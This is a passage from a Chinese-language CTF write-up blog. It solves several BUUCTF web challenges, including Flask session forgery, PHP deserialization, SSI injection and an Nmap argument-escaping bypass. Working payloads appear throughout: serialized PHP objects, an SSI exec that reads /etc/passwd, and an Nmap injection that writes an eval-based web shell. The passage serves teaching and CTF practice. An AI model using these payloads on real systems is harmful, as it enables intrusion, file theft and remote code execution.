class="number">8</span>sGETcwTmHMFMf_zOPTo<span class="number">1</span>gsz-gUE<span class="number">6</span>DnbUB<span class="number">7</span>yFXnOSNE<span class="number">2</span>l<span class="number">8</span>Pt<span class="number">25</span>fX<span class="number">9</span>wROtzUG<span class="number">9</span>CLZVSZIyp<span class="number">2</span>PjN<span class="number">5</span>ZUOkAQUaTdm<span class="number">4</span>c<span class="number">1</span>qinnLhQ-YBy<span class="number">9</span>dJV<span class="number">4</span>fhVvk<span class="number">37</span>WNJT<span class="number">90</span>-uxzABcv<span class="number">25</span>tGRG<span class="number">7</span>m<span class="number">3</span>ZvG<span class="number">4</span>jcUSevxidbLs.Xwb<span class="number">4</span>GQ.icCsKPYayHjgXi<span class="number">1</span>rCcbFCkrVJnI;</span><br></pre></td></tr></table></figure>
<p>解密:<code>python flask_session_manager.py decode -c -s # -c是flask cookie里的session值 -s参数是SECRET_KEY</code><br> 加密:<code>python flask_session_manager.py encode -s -t # -s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式</code></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu4.png"></p>
<p>这里将name的值改为admin</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu5.png"></p>
<p>登入后页面修改伪造的session得到flag</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu6.png"></p>
<hr>
<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>]；</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p><code>file_get_contents</code>可以利用<code>php://input</code>绕过，然后要利用伪协议读取useless.php文件</p>
<p><img src="https://img.npfs06.top/20210307164311.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>base64解码后</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>很简单的反序列化</p>
<p>最终payload</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?<span class="type">text</span>=php://<span class="keyword">input</span>&amp;file=useless.php&amp;<span class="keyword">password</span>=O:<span class="number">4</span>:&quot;Flag&quot;:<span class="number">1</span>:&#123;s:<span class="number">4</span>:&quot;file&quot;;s:<span class="number">8</span>:&quot;flag.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">POST:welcome <span class="keyword">to</span> the zjctf</span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210307164111.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>ps:这里是file=useless.php而不是file=php://filter/convert.base64-encode/resource=useless.php<br>因为我们要include的是这个页面，不是它的Base64化的源码<br>php://filter/convert.base64-encode/resource=useless.php的作用是读取useless.php页面的源码（经过bae64）</p>
<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu7.png"></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu8.png"></p>
<h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要绕过两个地方：</p>
<p>1、is_valid()函数规定字符的ASCII码必须是32-125，而protected属性在序列化后会出现不可见字符\00*\00，转化为ASCII码不符合要求。</p>
<p>绕过方法：</p>
<p>①PHP7.1以上版本对属性类型不敏感，public属性序列化不会出现不可见字符，可以用public属性来绕过</p>
<p>2、__destruct()魔术方法中，op===”2”是强比较，而process()使用的是弱比较op==”2”，可以通过弱类型绕过。</p>
<p>绕过方法：op=2，这里的2是整数int类型，op=2时，op===”2”为false，op==”2”为true</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span> = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在不知道flag.php文件路径的时候，可以通过读取系统配置文件、容器配置文件来猜flag的绝对路径。</p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">linux提供了/<span class="keyword">proc</span>/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/<span class="keyword">proc</span>/本进程pid/。进程可以通过访问/<span class="keyword">proc</span>/self/目录来获取自己的信息。</span><br><span class="line"></span><br><span class="line">maps 记录一些调用的扩展或者自定义<span class="title"> so</span> 文件</span><br><span class="line"></span><br><span class="line">environ 环境变量</span><br><span class="line"></span><br><span class="line">comm 当前进程运行的程序</span><br><span class="line"></span><br><span class="line">cmdline 程序运行的绝对路径</span><br><span class="line"></span><br><span class="line">cpuset<span class="title"> docker</span> 环境可以看<span class="title"> machine</span> ID</span><br><span class="line"></span><br><span class="line">cgroup<span class="title"> docker环境下全是</span> machine<span class="title"> ID</span> 不太常用</span><br></pre></td></tr></table></figure>


<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>源码.swp泄露，通过审计，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">if</span> md5(<span class="built_in">str</span>(i)).startswith(<span class="string">&#x27;6d0bc1&#x27;</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>爆破得到密码为2020666，先测试一下网站基本功能，用户名aaa，密码2020666登录进去，在network处获得文件路径（抓包也可以看到），文件后缀为shtml</p>
<p><img src="https://img.npfs06.top/20210326235216.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>ssi注入</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">首先，介绍下SHTML，在SHTML文件中使用SSI指令引用其他的html文件（<span class="meta">#<span class="meta-keyword">include</span>），此时服务器会将SHTML中包含的SSI指令解</span></span><br><span class="line">释，再传送给客户端，此时的HTML中就不再有SSI指令了。比如说框架是固定的，但是里面的文章，其他菜单等即可以用<span class="meta">#<span class="meta-keyword">include</span>引用进来。</span></span><br></pre></td></tr></table></figure>
<p>看到后缀为shtml，可考虑尝试</p>
<p><strong>利用SSI注入漏洞，我们可以在username变量中传入ssi语句来远程执行系统命令&lt;#exec&gt;</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p><strong>知识点：</strong></p>
<ol>
<li><strong>Nmap的文件读写操作</strong></li>
<li><strong>escapeshellarg() + escapeshellcmd（）函数的使用</strong></li>
</ol>
<p>nmap的输出文件选项：</p>
<ul>
<li>-oN 标准保存</li>
<li>-oX XML保存</li>
<li>-oG Grep保存</li>
<li>-oA 保存到所有格式</li>
<li>-append-output 补充保存文件</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;settings.php&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;host&#x27;</span>])):</span><br><span class="line">	<span class="keyword">if</span> (!defined(<span class="string">&#x27;WEB_SCANS&#x27;</span>)) &#123;</span><br><span class="line">        	<span class="keyword">die</span>(<span class="string">&#x27;Web scans disabled&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="variable">$host</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(stripos(<span class="variable">$host</span>,<span class="string">&#x27;php&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">	<span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line"> </span><br><span class="line">	<span class="variable">$filename</span> = substr(md5(time() . rand(<span class="number">1</span>, <span class="number">10</span>)), <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">	<span class="variable">$command</span> = <span class="string">&quot;nmap &quot;</span>. NMAP_ARGS . <span class="string">&quot; -oX &quot;</span> . RESULTS_PATH . <span class="variable">$filename</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$host</span>;</span><br><span class="line">	<span class="variable">$result_scan</span> = shell_exec(<span class="variable">$command</span>);</span><br><span class="line">	<span class="keyword">if</span> (is_null(<span class="variable">$result_scan</span>)) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Something went wrong&#x27;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: result.php?f=&#x27;</span> . <span class="variable">$filename</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>主要语句：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">command</span> = <span class="string">&quot;nmap &quot;</span>. NMAP_ARGS . <span class="string">&quot; -oX &quot;</span> . RESULTS_PATH . <span class="variable">$filename</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$host</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">result_scan = shell_exec(<span class="variable">$command</span>);</span></span><br></pre></td></tr></table></figure>
<p>带入之后相当于：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> nmap <span class="literal">-Pn</span> <span class="literal">-T4</span> <span class="operator">-F</span> -<span class="literal">-host</span><span class="literal">-timeout</span> <span class="number">1000</span>ms <span class="literal">-oX</span> xml/<span class="variable">$filename</span> <span class="variable">$host</span></span><br></pre></td></tr></table></figure>
<p><strong>方法一：直接读flag写入文件</strong></p>
<ul>
<li>-iL:从文件中加载目标</li>
<li>-oN:将扫描后的文件信息以“Normal”的形式输出存储</li>
</ul>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; -iL /flag -oN flag.txt &#x27;</span><br></pre></td></tr></table></figure>


<blockquote>
<p>　-iL　　从inputfilename文件中读取扫描的目标。</p>
<p>　-oN   把扫描结果重定向到一个可读的文件logfilename中。</p>
</blockquote>
<p><strong>方法二</strong></p>
<p>payload 2 (单引号逃逸 类似 [BUUCTF 2018]Online Tool):<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/168093#h2-0">PHP-escapeshell-命令执行</a></p>
<blockquote>
<p><strong>escapeshellarg</strong> — 把字符串转码为可以在 shell 命令里使用的参数</p>
</blockquote>
<p><strong>功能</strong> ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)</p>
<blockquote>
<p><strong>escapeshellcmd</strong> — shell 元字符转义</p>
</blockquote>
<p>功能：<strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.exec.php">exec()</a> 或 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.system.php">system()</a> 函数，或者 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/language.operators.execution.php">执行操作符</a> 之前进行转义。</p>
<p>反斜线（\）会在以下字符之前插入： <em>&amp;#;`|\</em>?~&lt;&gt;^()[]{}$<em>, <em>\x0A</em> 和 <em>\xFF\</em>。 *’</em> 和 <em>“</em> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <em>%</em> 和 <em>!</em> 字符都会被空格代替。</p>
<p>详细分析一下这个过程：</p>
<ol>
<li><p>传入的参数是</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>&#x27; -v -d a=<span class="number">1</span></span><br></pre></td></tr></table></figure></li>
<li><p>由于<code>escapeshellarg</code>先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span>\<span class="string">&#x27;&#x27;</span> -v -d <span class="attribute">a</span>=1&#x27;</span><br></pre></td></tr></table></figure></li>
<li><p>经过<code>escapeshellcmd</code>针对第二步处理之后的参数中的<code>\</code>以及<code>a=1&#39;</code>中的单引号进行处理转义之后的效果如下所示：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span>\\<span class="string">&#x27;&#x27;</span> -v -d <span class="attribute">a</span>=1\&#x27;</span><br></pre></td></tr></table></figure></li>
<li><p>由于第三步处理之后的payload中的<code>\\</code>被解释成了<code>\</code>而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分</p>
</li>
</ol>
<p>所以这个payload可以简化为<code>curl 127.0.0.1\ -v -d a=1&#39;</code>，即向<code>127.0.0.1\</code>发起请求，POST 数据为<code>a=1&#39;</code>。</p>
<p>因为过滤了php,可以用phtml绕过，里面的内容用短标签</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=<span class="string">&#x27;&lt;?=eval($_GET[a]);?&gt; -oG flag.phtml &#x27;</span></span><br></pre></td></tr></table></figure>
